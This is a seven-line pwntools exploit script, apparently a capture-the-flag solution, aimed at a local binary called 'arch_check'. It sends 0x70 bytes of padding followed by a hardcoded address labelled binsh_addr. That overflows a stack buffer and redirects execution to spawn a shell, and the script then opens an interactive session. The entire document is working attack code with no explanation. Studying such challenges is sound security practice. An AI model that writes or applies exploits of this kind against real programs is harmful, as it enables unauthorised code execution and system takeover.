from pwn import *

sh = process("./arch_check")
binsh_addr = 0x0804863a
payload = flat(["A" * 0x70],binsh_addr)
sh.sendline(payload)
sh.interactive()